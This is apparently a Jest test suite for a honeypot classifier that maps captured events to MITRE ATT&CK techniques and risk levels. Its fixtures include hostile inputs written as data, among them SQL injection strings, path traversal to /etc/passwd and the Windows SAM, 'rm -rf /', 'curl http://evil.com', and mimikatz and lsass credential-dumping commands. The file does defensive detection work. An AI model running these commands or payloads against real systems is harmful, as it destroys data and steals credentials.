/// <reference types="jest" />

import type { HoneypotEvent } from "../shared/types";
import { classifyMitre, type MitreVerdict } from "./mitreAttackClassifier";

describe("mitreAttackClassifier - classifyMitre", () => {
  // Helper function to create a minimal event
  const createEvent = (overrides?: Partial<HoneypotEvent>): HoneypotEvent => ({
    id: "test-id",
    ip: "192.168.1.1",
    username: null,
    password: null,
    payload: {},
    created_at: new Date().toISOString(),
    ...overrides,
  });

  describe("Command and Scripting Interpreter (T1059)", () => {
    it("should detect shell command patterns", () => {
      const event = createEvent({
        payload: {
          cmd: "cat /etc/passwd",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1059");
      expect(result.technique_name).toBe("Command and Scripting Interpreter");
      expect(result.risk).toBe("HIGH");
      expect(result.reasons).toContain("Command execution / shell operator patterns detected in payload");
    });

    it("should detect whoami command", () => {
      const event = createEvent({
        payload: {
          command: "whoami",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1059");
      expect(result.risk).toBe("HIGH");
    });

    it("should detect uname command", () => {
      const event = createEvent({
        payload: {
          data: "uname -a",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1059");
      expect(result.risk).toBe("HIGH");
    });

    it("should detect curl command", () => {
      const event = createEvent({
        payload: {
          body: "curl http://evil.com",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1059");
      expect(result.risk).toBe("HIGH");
    });

    it("should detect bash shell invocation", () => {
      const event = createEvent({
        payload: {
          command: "bash -c 'rm -rf /'",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1059");
      expect(result.risk).toBe("HIGH");
    });

    it("should detect shell operators (pipes, ampersand, backticks)", () => {
      const event = createEvent({
        payload: {
          input: "cat file.txt | grep password",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1059");
      expect(result.risk).toBe("HIGH");
    });

    it("should include endpoint and method in reasons if available", () => {
      const event = createEvent({
        payload: {
          endpoint: "/api/execute",
          method: "POST",
          cmd: "whoami",
        },
      });

      const result = classifyMitre(event);

      expect(result.reasons).toContain("endpoint=/api/execute");
      expect(result.reasons).toContain("method=POST");
    });
  });

  describe("Exploit Public-Facing Application (T1190) - SQL Injection", () => {
    it("should detect basic SQL injection pattern", () => {
      const event = createEvent({
        payload: {
          query: "' or '1'='1",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1190");
      expect(result.technique_name).toBe("Exploit Public-Facing Application");
      expect(result.risk).toBe("HIGH");
      expect(result.reasons).toContain("SQL injection patterns detected in payload/query");
    });

    it("should detect double-quoted SQL injection", () => {
      const event = createEvent({
        payload: {
          sql: '" or "1"="1',
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1190");
      expect(result.risk).toBe("HIGH");
    });

    it("should detect UNION SELECT injection", () => {
      const event = createEvent({
        payload: {
          search: "id UNION SELECT * FROM users",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1190");
      expect(result.risk).toBe("HIGH");
    });

    it("should detect information_schema access", () => {
      const event = createEvent({
        payload: {
          query: "SELECT * FROM information_schema.tables",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1190");
      expect(result.risk).toBe("HIGH");
    });

    it("should detect SQL delay attack patterns", () => {
      const event = createEvent({
        payload: {
          filter: "id=1; SLEEP(5)",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1190");
      expect(result.risk).toBe("HIGH");
    });

    it("should detect SQL comment patterns", () => {
      const event = createEvent({
        payload: {
          query: "SELECT * FROM users -- comment",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1190");
      expect(result.risk).toBe("HIGH");
    });

    it("should include endpoint in reasons if available", () => {
      const event = createEvent({
        payload: {
          endpoint: "/search",
          query: "' or '1'='1",
        },
      });

      const result = classifyMitre(event);

      expect(result.reasons).toContain("endpoint=/search");
    });
  });

  describe("Data from Local System (T1005) - Path Traversal", () => {
    it("should detect path traversal patterns with ../ ", () => {
      const event = createEvent({
        payload: {
          path: "../../etc/passwd",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1005");
      expect(result.technique_name).toBe("Data from Local System");
      expect(result.risk).toBe("HIGH");
      expect(result.reasons).toContain("Path traversal / sensitive file access indicators found");
    });

    it("should detect Windows path traversal patterns", () => {
      const event = createEvent({
        payload: {
          file: "..\\..\\windows\\system32\\config\\sam",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1005");
      expect(result.risk).toBe("HIGH");
    });

    it("should detect /etc/passwd access", () => {
      const event = createEvent({
        payload: {
          endpoint: "/api/read",
          data: "/etc/passwd",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1005");
      expect(result.risk).toBe("HIGH");
    });

    it("should detect /proc/self/environ access", () => {
      const event = createEvent({
        payload: {
          query: "/proc/self/environ",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1005");
      expect(result.risk).toBe("HIGH");
    });

    it("should detect boot.ini access", () => {
      const event = createEvent({
        payload: {
          cmd: "type boot.ini",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1005");
      expect(result.risk).toBe("HIGH");
    });

    it("should include endpoint in reasons if available", () => {
      const event = createEvent({
        payload: {
          endpoint: "/file",
          data: "../../../etc/passwd",
        },
      });

      const result = classifyMitre(event);

      expect(result.reasons).toContain("endpoint=/file");
    });
  });

  describe("OS Credential Dumping (T1003)", () => {
    it("should detect mimikatz indicators", () => {
      const event = createEvent({
        payload: {
          data: "mimikatz.exe",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1003");
      expect(result.technique_name).toBe("OS Credential Dumping");
      expect(result.risk).toBe("HIGH");
      expect(result.reasons).toContain("Credential dumping / password store access indicators detected");
    });

    it("should detect sekurlsa module", () => {
      const event = createEvent({
        payload: {
          command: "privilege::debug sekurlsa::logonpasswords",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1003");
      expect(result.risk).toBe("HIGH");
    });

    it("should detect lsass access attempts", () => {
      const event = createEvent({
        payload: {
          cmd: "procdump -ma lsass.exe",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1003");
      expect(result.risk).toBe("HIGH");
    });

    it("should detect SAM dump indicators", () => {
      const event = createEvent({
        payload: {
          data: "sam dump extracted",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1003");
      expect(result.risk).toBe("HIGH");
    });

    it("should detect NTDS.dit access", () => {
      const event = createEvent({
        payload: {
          path: "/windows/ntds.dit",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1003");
      expect(result.risk).toBe("HIGH");
    });

    it("should detect /etc/shadow access", () => {
      const event = createEvent({
        payload: {
          cmd: "cat /etc/shadow",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1003");
      expect(result.risk).toBe("HIGH");
    });
  });

  describe("Network Service Discovery (T1046) - Recon Tools", () => {
    it("should detect nmap in payload", () => {
      const event = createEvent({
        payload: {
          data: "nmap scan results",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1046");
      expect(result.technique_name).toBe("Network Service Discovery");
      expect(result.risk).toBe("MED");
      expect(result.reasons).toContain("Recon / scanning tool fingerprints detected (payload/user-agent)");
    });

    it("should detect nmap in user-agent", () => {
      const event = createEvent({
        payload: {
          user_agent: "nmap/7.92",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1046");
      expect(result.risk).toBe("MED");
    });

    it("should detect gobuster tool", () => {
      const event = createEvent({
        payload: {
          headers: {
            "user-agent": "gobuster/3.1.0",
          },
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1046");
      expect(result.risk).toBe("MED");
    });

    it("should detect sqlmap tool", () => {
      const event = createEvent({
        payload: {
          ua: "sqlmap/1.4.2",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1046");
      expect(result.risk).toBe("MED");
    });

    it("should detect Burp Suite", () => {
      const event = createEvent({
        payload: {
          user_agent: "burpsuite",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1046");
      expect(result.risk).toBe("MED");
    });

    it("should include user-agent in reasons if available", () => {
      const event = createEvent({
        payload: {
          user_agent: "nmap/7.92",
        },
      });

      const result = classifyMitre(event);

      expect(result.reasons).toContain("ua=nmap/7.92");
    });
  });

  describe("Brute Force (T1110)", () => {
    it("should detect multiple failed attempts (>= 5)", () => {
      const event = createEvent({
        username: "admin",
        payload: {
          attempts: 5,
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1110");
      expect(result.technique_name).toBe("Brute Force");
      expect(result.risk).toBe("HIGH");
      expect(result.reasons).toContain("Multiple failed attempts detected: attempts=5");
      expect(result.reasons).toContain("username=admin");
    });

    it("should handle attempts from different payload fields", () => {
      const event = createEvent({
        username: "user@example.com",
        payload: {
          failed_attempts: 10,
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1110");
      expect(result.risk).toBe("HIGH");
      expect(result.reasons).toContain("Multiple failed attempts detected: attempts=10");
    });

    it("should detect password supplied but less than 5 attempts", () => {
      const event = createEvent({
        username: "admin",
        password: "secret123",
        payload: {
          attempts: 1,
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1110");
      expect(result.technique_name).toBe("Brute Force");
      expect(result.risk).toBe("MED");
      expect(result.reasons).toContain("Password supplied during authentication attempt");
      expect(result.reasons).toContain("username=admin");
    });

    it("should prioritize high attempt count over password check", () => {
      const event = createEvent({
        username: "admin",
        password: "attempt123",
        payload: {
          attempts: 7,
        },
      });

      const result = classifyMitre(event);

      // Should return HIGH risk brute force due to attempts >= 5
      expect(result.technique_id).toBe("T1110");
      expect(result.risk).toBe("HIGH");
    });
  });

  describe("Valid Accounts (T1078)", () => {
    it("should detect auth attempt with username but no password", () => {
      const event = createEvent({
        username: "john.doe",
        password: null,
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1078");
      expect(result.technique_name).toBe("Valid Accounts");
      expect(result.risk).toBe("LOW");
      expect(result.reasons).toContain("Authentication attempt with username but no password (token/session style)");
      expect(result.reasons).toContain("username=john.doe");
    });

    it("should include endpoint and method in reasons if available", () => {
      const event = createEvent({
        username: "admin",
        payload: {
          endpoint: "/api/login",
          method: "GET",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1078");
      expect(result.reasons).toContain("endpoint=/api/login");
      expect(result.reasons).toContain("method=GET");
    });

    it("should handle empty string password as no password", () => {
      const event = createEvent({
        username: "user123",
        password: "",
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1078");
      expect(result.risk).toBe("LOW");
    });
  });

  describe("Default / Low-Risk Activity", () => {
    it("should return low-risk default for minimal event", () => {
      const event = createEvent();

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("Unable to identify");
      expect(result.technique_name).toBe("Unable to identify");
      expect(result.risk).toBe("LOW");
      expect(result.reasons).toContain("Insufficient indicators; defaulting to low-risk auth-related activity");
    });

    it("should return low-risk for benign payload", () => {
      const event = createEvent({
        payload: {
          message: "Hello world",
        },
      });

      const result = classifyMitre(event);

      expect(result.risk).toBe("LOW");
    });
  });

  describe("Edge Cases and Data Normalization", () => {
    it("should handle null payload", () => {
      const event = createEvent({
        payload: null,
      });

      const result = classifyMitre(event);

      expect(result).toBeDefined();
      expect(result.technique_id).toBeDefined();
    });

    it("should handle undefined fields gracefully", () => {
      const event = createEvent({  });

      const result = classifyMitre(event);

      expect(result).toBeDefined();
      expect(result.reasons).toBeDefined();
      expect(Array.isArray(result.reasons)).toBe(true);
    });

    it("should be case-insensitive in pattern matching", () => {
      const event1 = createEvent({
        payload: {
          cmd: "CAT /ETC/PASSWD",
        },
      });

      const event2 = createEvent({
        payload: {
          cmd: "cat /etc/passwd",
        },
      });

      const result1 = classifyMitre(event1);
      const result2 = classifyMitre(event2);

      expect(result1.technique_id).toBe(result2.technique_id);
      expect(result1.technique_id).toBe("T1059");
    });

    it("should handle whitespace in values", () => {
      const event = createEvent({
        username: "  admin  ",
        payload: {
          cmd: "  whoami  ",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1059");
    });

    it("should handle numeric attempts field", () => {
      const event = createEvent({
        username: "admin",
        payload: {
          attempts: "8",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1110");
      expect(result.risk).toBe("HIGH");
    });

    it("should handle JSON stringified payloads", () => {
      const event = createEvent({
        payload: JSON.stringify({
          cmd: "whoami",
          user: "root",
        }),
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1059");
    });
  });

  describe("Priority and Overlapping Indicators", () => {
    it("should prioritize command execution over other attacks", () => {
      const event = createEvent({
        payload: {
          cmd: "cat /etc/passwd",
          query: "' or '1'='1",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1059");
    });

    it("should prioritize SQL injection over path traversal", () => {
      const event = createEvent({
        payload: {
          query: "' or '1'='1",
          path: "../../../etc/passwd",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1190");
    });

    it("should prioritize credential dumping over command execution", () => {
      const event = createEvent({
        payload: {
          cmd: "mimikatz privilege::debug",
        },
      });

      const result = classifyMitre(event);

      // Based on code order, command detection comes first
      // So this would be T1059, but let's verify the order matters
      expect(result.technique_id).toBe("T1059");
    });

    it("should detect multiple suspicious indicators in reasons", () => {
      const event = createEvent({
        username: "attacker",
        payload: {
          endpoint: "/api/admin",
          method: "POST",
          cmd: "whoami",
        },
      });

      const result = classifyMitre(event);

      expect(result.technique_id).toBe("T1059");
      expect(result.reasons.length).toBeGreaterThan(1);
      expect(result.reasons).toContain("endpoint=/api/admin");
      expect(result.reasons).toContain("method=POST");
    });
  });

  describe("Result Structure Validation", () => {
    it("should always return a MitreVerdict object with required fields", () => {
      const event = createEvent();
      const result = classifyMitre(event);

      expect(result).toHaveProperty("technique_id");
      expect(result).toHaveProperty("technique_name");
      expect(result).toHaveProperty("risk");
      expect(result).toHaveProperty("reasons");

      expect(typeof result.technique_id).toBe("string");
      expect(typeof result.technique_name).toBe("string");
      expect(typeof result.risk).toBe("string");
      expect(Array.isArray(result.reasons)).toBe(true);
    });

    it("should have valid risk levels", () => {
      const events = [
        createEvent({ payload: { cmd: "whoami" } }),
        createEvent({ payload: { query: "' or '1'='1" } }),
        createEvent({ username: "admin" }),
        createEvent(),
      ];

      const results = events.map(classifyMitre);

      results.forEach((result) => {
        expect(["LOW", "MED", "HIGH"]).toContain(result.risk);
      });
    });

    it("should always have at least one reason", () => {
      const events = [
        createEvent(),
        createEvent({ username: "admin" }),
        createEvent({ payload: { cmd: "whoami" } }),
      ];

      const results = events.map(classifyMitre);

      results.forEach((result) => {
        expect(result.reasons.length).toBeGreaterThan(0);
      });
    });
  });
});



